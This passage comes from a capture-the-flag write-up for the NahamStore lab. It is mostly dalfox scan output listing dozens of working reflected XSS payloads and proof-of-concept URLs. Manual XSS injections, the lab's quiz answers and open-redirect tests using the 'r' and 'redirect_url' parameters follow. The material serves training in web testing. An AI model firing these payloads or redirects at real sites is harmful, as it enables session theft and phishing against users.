+[W] Reflected Payload in HTML: name=<div contextmenu=xss><p>1<menu type=context onshow=alert(1)></menu></div>
+    7 line:  <title>NahamStore - <div contextmenu=xss><p>1<menu type=context onshow=alert(1)>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cdiv+contextmenu%3Dxss%3E%3Cp%3E1%3Cmenu+type%3Dcontext+onshow%3Dalert%281%29%3E%3C%2Fmenu%3E%3C%2Fdiv%3E
+[W] Reflected Payload in HTML: name='"><img/src/onerror=.1|alert``>
+    7 line:      <title>NahamStore - '"><img/src/onerror=.1|alert``></title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%27%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60%3E
+[W] Reflected Payload in HTML: name=<ScRipt class=dalfox>prompt.valueOf()(1)</script>
+    7 line:  <title>NahamStore - <ScRipt class=dalfox>prompt.valueOf()(1)</script></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CScRipt+class%3Ddalfox%3Eprompt.valueOf%28%29%281%29%3C%2Fscript%3E
+[W] Reflected Payload in HTML: name=<xmp><p title="</xmp><svg/onload=alert(1) class=dalfox>
+    7 line:  <title>NahamStore - <xmp><p title="</xmp><svg/onload=alert(1) class=dalfox></tit
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dalert%281%29+class%3Ddalfox%3E
+[W] Reflected Payload in HTML: name=<sVg/onload=confirm(1) class=dalfox>
+    7 line:      <title>NahamStore - <sVg/onload=confirm(1) class=dalfox></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CsVg%2Fonload%3Dconfirm%281%29+class%3Ddalfox%3E
+[W] Reflected Payload in HTML: name=<iframe srcdoc="<input onauxclick=confirm(1)>" class=dalfox></iframe>
+    7 line:  <title>NahamStore - <iframe srcdoc="<input onauxclick=confirm(1)>" class=dalfox>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Ciframe+srcdoc%3D%22%3Cinput+onauxclick%3Dconfirm%281%29%3E%22+class%3Ddalfox%3E%3C%2Fiframe%3E
+[W] Reflected Payload in HTML: name='><sVg/onload=alert(1) id=dalfox>waiting headless
+    7 line:      <title>NahamStore - '><sVg/onload=alert(1) id=dalfox></title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%27%3E%3CsVg%2Fonload%3Dalert%281%29+id%3Ddalfox%3E
+[W] Reflected Payload in HTML: name=<xmp><p title="</xmp><svg/onload=print(1)>eadless
+    7 line:      <title>NahamStore - <xmp><p title="</xmp><svg/onload=print(1)></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dprint%281%29%3E
+[W] Reflected Payload in HTML: name='"><iframe srcdoc="<input onauxclick=alert(1)>" class=dalfox></iframe>
+    7 line:  <title>NahamStore - '"><iframe srcdoc="<input onauxclick=alert(1)>" class=dalfox
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%27%22%3E%3Ciframe+srcdoc%3D%22%3Cinput+onauxclick%3Dalert%281%29%3E%22+class%3Ddalfox%3E%3C%2Fiframe%3E
+[W] Reflected Payload in HTML: name=<xmp><p title="</xmp><svg/onload=prompt(1)>
+    7 line:      <title>NahamStore - <xmp><p title="</xmp><svg/onload=prompt(1)></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dprompt%281%29%3E
+[W] Reflected Payload in HTML: name=</ScriPt><sCripT class=dalfox>alert(1)</sCriPt>
+    7 line:      <title>NahamStore - </ScriPt><sCripT class=dalfox>alert(1)</sCriPt></title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3C%2FScriPt%3E%3CsCripT+class%3Ddalfox%3Ealert%281%29%3C%2FsCriPt%3E
+[W] Reflected Payload in HTML: name='"><svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
+    7 line:  <title>NahamStore - '"><svg/onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f<
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%27%22%3E%3Csvg%2Fonload%3D%26%2397%26%23108%26%23101%26%23114%26%2300116%26%2340%26%2341%26%23x2f%26%23x2f
+[W] Reflected Payload in HTML: name='><sVg/onload=alert(1) class=dalfox>ting headless
+    7 line:      <title>NahamStore - '><sVg/onload=alert(1) class=dalfox></title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%27%3E%3CsVg%2Fonload%3Dalert%281%29+class%3Ddalfox%3E
+[W] Reflected Payload in HTML: name=<ScRipt>alert.bind()(1)</script>
+    7 line:      <title>NahamStore - <ScRipt>alert.bind()(1)</script></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CScRipt%3Ealert.bind%28%29%281%29%3C%2Fscript%3E
+[W] Reflected Payload in HTML: name=<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()>ess
+    7 line:      <title>NahamStore - <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a()></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CdETAILS%250aopen%250aonToGgle%250a%3D%250aa%3Dprompt%2Ca%28%29%3E
+[W] Reflected Payload in HTML: name=<iFrAme/src=jaVascRipt:alert(1)></iFramE>
+    7 line:      <title>NahamStore - <iFrAme/src=jaVascRipt:alert(1)></iFramE></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CiFrAme%2Fsrc%3DjaVascRipt%3Aalert%281%29%3E%3C%2FiFramE%3E
+[W] Reflected Payload in HTML: name=<ScRipt class=dalfox>prompt(1)</script>g headless
+    7 line:      <title>NahamStore - <ScRipt class=dalfox>prompt(1)</script></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CScRipt+class%3Ddalfox%3Eprompt%281%29%3C%2Fscript%3E
+[W] Reflected Payload in HTML: name=<iFrAme/src=jaVascRipt:prompt(1) class=dalfox></iFramE>
+    7 line:  <title>NahamStore - <iFrAme/src=jaVascRipt:prompt(1) class=dalfox></iFramE></tit
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CiFrAme%2Fsrc%3DjaVascRipt%3Aprompt%281%29+class%3Ddalfox%3E%3C%2FiFramE%3E
+[W] Reflected Payload in HTML: name="><svg/OnLoad="`${prompt``}`" class=dalfox>
+    7 line:      <title>NahamStore - "><svg/OnLoad="`${prompt``}`" class=dalfox></title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3Csvg%2FOnLoad%3D%22%60%24%7Bprompt%60%60%7D%60%22+class%3Ddalfox%3E
+[W] Reflected Payload in HTML: name="><d3"<"/onclick=">[confirm``]"<">ziting headless
+    7 line:      <title>NahamStore - "><d3"<"/onclick=">[confirm``]"<">z</title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3Cd3%22%3C%22%2Fonclick%3D%22%3E%5Bconfirm%60%60%5D%22%3C%22%3Ez
+[W] Reflected Payload in HTML: name=<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() class=dalfox>
+    7 line:  <title>NahamStore - <dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() class=dalfox><
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CdETAILS%250aopen%250aonToGgle%250a%3D%250aa%3Dprompt%2Ca%28%29+class%3Ddalfox%3E
+[W] Reflected Payload in HTML: name=<ScRipt>prompt.valueOf()(1)</script>eadless
+    7 line:      <title>NahamStore - <ScRipt>prompt.valueOf()(1)</script></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CScRipt%3Eprompt.valueOf%28%29%281%29%3C%2Fscript%3E
+[W] Reflected Payload in HTML: name='><a href=javas&#99;ript:alert(1)/class=dalfox>click
+    7 line:  <title>NahamStore - '><a href=javas&#99;ript:alert(1)/class=dalfox>click</title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%27%3E%3Ca+href%3Djavas%26%2399%3Bript%3Aalert%281%29%2Fclass%3Ddalfox%3Eclick
+[W] Reflected Payload in HTML: name=<iframe srcdoc="<input onauxclick=alert(1)>" class=dalfox></iframe>
+    7 line:  <title>NahamStore - <iframe srcdoc="<input onauxclick=alert(1)>" class=dalfox></
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Ciframe+srcdoc%3D%22%3Cinput+onauxclick%3Dalert%281%29%3E%22+class%3Ddalfox%3E%3C%2Fiframe%3E
+[W] Reflected Payload in HTML: name="><a href=javas&#99;ript:alert(1)/class=dalfox>click
+    7 line:  <title>NahamStore - "><a href=javas&#99;ript:alert(1)/class=dalfox>click</title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3Ca+href%3Djavas%26%2399%3Bript%3Aalert%281%29%2Fclass%3Ddalfox%3Eclick
+[W] Reflected Payload in HTML: name=<sVg/onload=alert(1)>queries and waiting headless
+    7 line:      <title>NahamStore - <sVg/onload=alert(1)></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CsVg%2Fonload%3Dalert%281%29%3E
+[W] Reflected Payload in HTML: name=<xmp><p title="</xmp><svg/onload=prompt(1) class=dalfox>
+    7 line:  <title>NahamStore - <xmp><p title="</xmp><svg/onload=prompt(1) class=dalfox></ti
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dprompt%281%29+class%3Ddalfox%3E
+[W] Reflected Payload in HTML: name=<iFrAme/src=jaVascRipt:alert.bind()(1)></iFramE>
+    7 line:      <title>NahamStore - <iFrAme/src=jaVascRipt:alert.bind()(1)></iFramE></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CiFrAme%2Fsrc%3DjaVascRipt%3Aalert.bind%28%29%281%29%3E%3C%2FiFramE%3E
+[W] Reflected Payload in HTML: name="><w="/x="y>"/class=dalfox/ondblclick=`<`[confirm``]>z
+    7 line:  <title>NahamStore - "><w="/x="y>"/class=dalfox/ondblclick=`<`[confirm``]>z</titl
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3Cw%3D%22%2Fx%3D%22y%3E%22%2Fclass%3Ddalfox%2Fondblclick%3D%60%3C%60%5Bconfirm%60%60%5D%3Ez
+[W] Reflected Payload in HTML: name=<sVg/onload=prompt.valueOf()(1) class=dalfox>less
+    7 line:      <title>NahamStore - <sVg/onload=prompt.valueOf()(1) class=dalfox></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CsVg%2Fonload%3Dprompt.valueOf%28%29%281%29+class%3Ddalfox%3E
+[W] Reflected Payload in HTML: name=<xmp><p title="</xmp><svg/onload=alert.bind()(1)>
+    7 line:  <title>NahamStore - <xmp><p title="</xmp><svg/onload=alert.bind()(1)></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dalert.bind%28%29%281%29%3E
+[W] Reflected Payload in HTML: name=<xmp><p title="</xmp><svg/onload=alert(1)>
+    7 line:      <title>NahamStore - <xmp><p title="</xmp><svg/onload=alert(1)></title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dalert%281%29%3E
+[W] Reflected Payload in HTML: name=<iframe srcdoc="<input onauxclick=prompt(1)>" class=dalfox></iframe>
+    7 line:  <title>NahamStore - <iframe srcdoc="<input onauxclick=prompt(1)>" class=dalfox><
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Ciframe+srcdoc%3D%22%3Cinput+onauxclick%3Dprompt%281%29%3E%22+class%3Ddalfox%3E%3C%2Fiframe%3E
+[W] Reflected Payload in HTML: name=<iframe srcdoc="<input onauxclick=print(1)>" class=dalfox></iframe>
+    7 line:  <title>NahamStore - <iframe srcdoc="<input onauxclick=print(1)>" class=dalfox></
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Ciframe+srcdoc%3D%22%3Cinput+onauxclick%3Dprint%281%29%3E%22+class%3Ddalfox%3E%3C%2Fiframe%3E
+[W] Reflected Payload in HTML: name=<ScRipt class=dalfox>print(1)</script>
+    7 line:      <title>NahamStore - <ScRipt class=dalfox>print(1)</script></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CScRipt+class%3Ddalfox%3Eprint%281%29%3C%2Fscript%3E
+[W] Reflected Payload in HTML: name=<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=alert(1)></menu></div>
+    7 line:  <title>NahamStore - <div contextmenu=xss><p>1<menu type=context class=dalfox id=
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cdiv+contextmenu%3Dxss%3E%3Cp%3E1%3Cmenu+type%3Dcontext+class%3Ddalfox+id%3Dxss+onshow%3Dalert%281%29%3E%3C%2Fmenu%3E%3C%2Fdiv%3E
+[W] Reflected Payload in HTML: name=</script><svg><script/class=dalfox>alert(1)</script>-%26apos;
+    7 line:  <title>NahamStore - </script><svg><script/class=dalfox>alert(1)</script>-%26apos
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3C%2Fscript%3E%3Csvg%3E%3Cscript%2Fclass%3Ddalfox%3Ealert%281%29%3C%2Fscript%3E-%2526apos%3B
+[W] Reflected Payload in HTML: name=<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=print(1)></menu></div>
+    7 line:  <title>NahamStore - <div contextmenu=xss><p>1<menu type=context class=dalfox id=
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cdiv+contextmenu%3Dxss%3E%3Cp%3E1%3Cmenu+type%3Dcontext+class%3Ddalfox+id%3Dxss+onshow%3Dprint%281%29%3E%3C%2Fmenu%3E%3C%2Fdiv%3E
+[W] Reflected Payload in HTML: name='><img/src/onerror=.1|alert`` class=dalfox>
+    7 line:      <title>NahamStore - '><img/src/onerror=.1|alert`` class=dalfox></title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%27%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60+class%3Ddalfox%3E
+[W] Reflected Payload in HTML: name=<sVg/onload=prompt(1) class=dalfox>headless
+    7 line:      <title>NahamStore - <sVg/onload=prompt(1) class=dalfox></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CsVg%2Fonload%3Dprompt%281%29+class%3Ddalfox%3E
+[W] Reflected Payload in HTML: name=<xmp><p title="</xmp><svg/onload=alert(1)>eadless
+    7 line:      <title>NahamStore - <xmp><p title="</xmp><svg/onload=alert(1)></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dalert%281%29%3E
+[W] Reflected Payload in HTML: name="><iFrAme/src=jaVascRipt:alert(1) class=dalfox></iFramE>
+    7 line:  <title>NahamStore - "><iFrAme/src=jaVascRipt:alert(1) class=dalfox></iFramE></ti
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3CiFrAme%2Fsrc%3DjaVascRipt%3Aalert%281%29+class%3Ddalfox%3E%3C%2FiFramE%3E
+[W] Reflected Payload in HTML: name=<xmp><p title="</xmp><svg/onload=prompt.valueOf()(1) class=dalfox>
+    7 line:  <title>NahamStore - <xmp><p title="</xmp><svg/onload=prompt.valueOf()(1) class=d
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dprompt.valueOf%28%29%281%29+class%3Ddalfox%3E
+[W] Reflected Payload in HTML: name=</ScriPt><sCripT id=dalfox>alert(1)</sCriPt>dless
+    7 line:      <title>NahamStore - </ScriPt><sCripT id=dalfox>alert(1)</sCriPt></title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3C%2FScriPt%3E%3CsCripT+id%3Ddalfox%3Ealert%281%29%3C%2FsCriPt%3E
+[W] Reflected Payload in HTML: name="><d3"<"/onclick=" class=dalfox>[confirm``]"<">z
+    7 line:      <title>NahamStore - "><d3"<"/onclick=" class=dalfox>[confirm``]"<">z</title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3Cd3%22%3C%22%2Fonclick%3D%22+class%3Ddalfox%3E%5Bconfirm%60%60%5D%22%3C%22%3Ez
+[W] Reflected Payload in HTML: name=<iFrAme/src=jaVascRipt:print(1)></iFramE>
+    7 line:      <title>NahamStore - <iFrAme/src=jaVascRipt:print(1)></iFramE></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CiFrAme%2Fsrc%3DjaVascRipt%3Aprint%281%29%3E%3C%2FiFramE%3E
+[W] Reflected Payload in HTML: name="><script y="><">/*<script* */prompt()</scriptess
+    7 line:      <title>NahamStore - "><script y="><">/*<script* */prompt()</script</title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3Cscript+y%3D%22%3E%3C%22%3E%2F%2A%3Cscript%2A+%2A%2Fprompt%28%29%3C%2Fscript
+[W] Reflected Payload in HTML: name=<sVg/onload=alert(1) class=dalfox>aiting headless
+    7 line:      <title>NahamStore - <sVg/onload=alert(1) class=dalfox></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CsVg%2Fonload%3Dalert%281%29+class%3Ddalfox%3E
+[W] Reflected Payload in HTML: name=<ScRipt>prompt(1)</script> waiting headless
+    7 line:      <title>NahamStore - <ScRipt>prompt(1)</script></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CScRipt%3Eprompt%281%29%3C%2Fscript%3E
+[W] Reflected Payload in HTML: name=<xmp><p title="</xmp><svg/onload=alert.bind()(1) class=dalfox>
+    7 line:  <title>NahamStore - <xmp><p title="</xmp><svg/onload=alert.bind()(1) class=dalfo
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dalert.bind%28%29%281%29+class%3Ddalfox%3E
+[W] Reflected Payload in HTML: name=<audio controls ondurationchange=prompt.valueOf()(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+    7 line:  <title>NahamStore - <audio controls ondurationchange=prompt.valueOf()(1) id=dalf
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Caudio+controls+ondurationchange%3Dprompt.valueOf%28%29%281%29+id%3Ddalfox%3E%3Csource+src%3D1.mp3+type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E
+[W] Reflected Payload in HTML: name=<iFrAme/src=jaVascRipt:alert.bind()(1) class=dalfox></iFramE>
+    7 line:  <title>NahamStore - <iFrAme/src=jaVascRipt:alert.bind()(1) class=dalfox></iFramE
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CiFrAme%2Fsrc%3DjaVascRipt%3Aalert.bind%28%29%281%29+class%3Ddalfox%3E%3C%2FiFramE%3E
+[W] Reflected Payload in HTML: name=<ScRipt>alert(1)</script>
+    7 line:      <title>NahamStore - <ScRipt>alert(1)</script></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CScRipt%3Ealert%281%29%3C%2Fscript%3E
+[W] Reflected Payload in HTML: name='"><svg/class=dalfox onload=&#97&#108&#101&#114&#00116&#40&#41&#x2f&#x2f
+    7 line:  <title>NahamStore - '"><svg/class=dalfox onload=&#97&#108&#101&#114&#00116&#40&#
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%27%22%3E%3Csvg%2Fclass%3Ddalfox+onload%3D%26%2397%26%23108%26%23101%26%23114%26%2300116%26%2340%26%2341%26%23x2f%26%23x2f
+[W] Reflected Payload in HTML: name=<ScRipt class=dalfox>alert(1)</script>
+    7 line:      <title>NahamStore - <ScRipt class=dalfox>alert(1)</script></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CScRipt+class%3Ddalfox%3Ealert%281%29%3C%2Fscript%3E
+[W] Reflected Payload in HTML: name="><script/"<a"/src=data:=".<a,[].some(confirm)>ss
+    7 line:      <title>NahamStore - "><script/"<a"/src=data:=".<a,[].some(confirm)></title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3Cscript%2F%22%3Ca%22%2Fsrc%3Ddata%3A%3D%22.%3Ca%2C%5B%5D.some%28confirm%29%3E
+[W] Reflected Payload in HTML: name=<sVg/onload=alert.bind()(1) class=dalfox>
+    7 line:      <title>NahamStore - <sVg/onload=alert.bind()(1) class=dalfox></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CsVg%2Fonload%3Dalert.bind%28%29%281%29+class%3Ddalfox%3E
+[W] Reflected Payload in HTML: name=<dalfox class=dalfox>
+    7 line:      <title>NahamStore - <dalfox class=dalfox></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Cdalfox+class%3Ddalfox%3E
+[W] Reflected Payload in HTML: name="><svg/class="dalfox"onLoad=alert(1)>ing headless
+    7 line:      <title>NahamStore - "><svg/class="dalfox"onLoad=alert(1)></title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3Csvg%2Fclass%3D%22dalfox%22onLoad%3Dalert%281%29%3E
+[W] Reflected Payload in HTML: name='"><img/src/onerror=.1|alert`` class=dalfox>
+    7 line:      <title>NahamStore - '"><img/src/onerror=.1|alert`` class=dalfox></title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%27%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60+class%3Ddalfox%3E
+[W] Reflected Payload in HTML: name="><img/src/onerror=.1|alert``>nd waiting headless
+    7 line:      <title>NahamStore - "><img/src/onerror=.1|alert``></title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60%3E
+[W] Reflected Payload in HTML: name="><iFrAme/src=jaVascRipt:alert(1)></iFramE>adless
+    7 line:      <title>NahamStore - "><iFrAme/src=jaVascRipt:alert(1)></iFramE></title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%22%3E%3CiFrAme%2Fsrc%3DjaVascRipt%3Aalert%281%29%3E%3C%2FiFramE%3E
+[W] Reflected Payload in HTML: name='><a href='javascript&colon;alert(1)'>click
+    7 line:      <title>NahamStore - '><a href='javascript&colon;alert(1)'>click</title>
+[POC][R][GET][inHTML-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%27%3E%3Ca+href%3D%27javascript%26colon%3Balert%281%29%27%3Eclick
+[W] Reflected Payload in HTML: name=<iFrAme/src=jaVascRipt:prompt(1)></iFramE>s
+    7 line:      <title>NahamStore - <iFrAme/src=jaVascRipt:prompt(1)></iFramE></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CiFrAme%2Fsrc%3DjaVascRipt%3Aprompt%281%29%3E%3C%2FiFramE%3E
+[W] Reflected Payload in HTML: name=<audio controls ondurationchange=prompt(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+    7 line:  <title>NahamStore - <audio controls ondurationchange=prompt(1) id=dalfox><source
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Caudio+controls+ondurationchange%3Dprompt%281%29+id%3Ddalfox%3E%3Csource+src%3D1.mp3+type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E
+[W] Reflected Payload in HTML: name=<ScRipt class=dalfox>alert.bind()(1)</script>less
+    7 line:      <title>NahamStore - <ScRipt class=dalfox>alert.bind()(1)</script></title>
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3CScRipt+class%3Ddalfox%3Ealert.bind%28%29%281%29%3C%2Fscript%3E
+[W] Reflected Payload in HTML: name=<audio controls ondurationchange=print(1) id=dalfox><source src=1.mp3 type=audio/mpeg></audio>
+    7 line:  <title>NahamStore - <audio controls ondurationchange=print(1) id=dalfox><source 
+[POC][R][GET][inHTML-none(1)-URL] http://nahamstore.thm/product?added=1&discount=&id=2&name=%3Caudio+controls+ondurationchange%3Dprint%281%29+id%3Ddalfox%3E%3Csource+src%3D1.mp3+type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E
+[*] ---------------------------------------------------------------------------------------------------------------------------------
+[*] [duration: 40.708454296s][issues: 107] Finish Scan!
+
+http://nahamstore.thm/product?added=1&discount=%22onpointerenter%3Dconfirm.call%28null%2C1%29+class%3Ddalfox+&id=2
+
+http://nahamstore.thm/product?added=1&discount=%22onpointerenter%3Dconfirm.call(null%2Cdocument.domain)+class%3Ddalfox+&id=2
+
+or using payloads from https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+like this
+
+http://nahamstore.thm/product?added=1&discount=%22%3Csvg/onload=alert(%27XSS%27)%3E
+
+http://nahamstore.thm/product?added=1&discount=%3Cdiv%20onpointerover=%22alert(document.domain)%22%3EMOVE%20HERE%3C/div%3E
+
+and so on  (hidden parameter was discount)
+
+http://nahamstore.thm/hi
+
+Page Not Found
+
+Sorry, we couldn't find /hi anywhere
+
+nahamstore.thm/<script>alert(document.domain)</script>
+
+nahamstore.thm
+
+I've found another in auth parameter
+
+<p class="text-center">Sorry, we couldn't find /returns/3?auth=<script>alert(window.origin)</script> anywhere</p>
+
+http://nahamstore.thm/returns/3?auth=<script>alert(window.origin)</script>
+
+http://nahamstore.thm
+
+Was really fun :)
+```
+![[Pasted image 20230320164607.png]]
+Enter an URL ( including parameters ) of an endpoint that is vulnerable to XSS
+*http://marketing.nahamstore.thm/?error*
+What HTTP header can be used to create a Stored XXS
+*User-Agent*
+What HTML tag needs to be escaped on the product page to get the XSS to work?
+*title*
+What JavaScript variable needs to be escaped to get the XSS to work?
+*search*
+What hidden parameter can be found on the shop home page that introduces an XSS vulnerability.
+*q*
+What HTML tag needs to be escaped on the returns page to get the XSS to work?
+*textarea*
+What is the value of the H1 tag of the page that uses the requested URL to create an XSS
+*Page Not Found*
+What other hidden parameter can be found on the shop which can introduce an XSS vulnerability
+*discount*
+### Open Redirect
+Find two URL parameters that produce an Open Redirect
+Answer the questions below
+```text
+┌──(witty㉿kali)-[~/bug_hunter/XSStrike]
+└─$ arjun -u http://nahamstore.thm/
+    _
+   /_| _ '
+  (  |/ /(//) v2.2.1
+      _/      
+
+[*] Probing the target for stability
+[*] Analysing HTTP response for anomalies
+[*] Analysing HTTP response for potential parameter names
+[+] Heuristic scanner found 1 parameter: q
+[*] Logicforcing the URL endpoint
+[✓] parameter detected: r, based on: http code
+[✓] parameter detected: q, based on: body length
+[+] Parameters found: r, q
+
+we found 2 params
+
+http://nahamstore.thm/?q=https://www.google.com
+
+https://www.google.com (written in search)
+
+now test with r param
+
+http://nahamstore.thm/?r=https://www.google.com
+
+we were redirected to google :)
+
+http://nahamstore.thm/account/addressbook?redirect_url=/basket
+
+look here redirect_url let's test
+
+http://nahamstore.thm/account/addressbook?redirect_url=https://www.google.com
+
+after pressing add address
+
+we were redirected to google :)
+
+here the same at the time of register and login
+
+http://nahamstore.thm/register?redirect_url=/basket
+
+http://nahamstore.thm/register?redirect_url=https://www.google.com
+
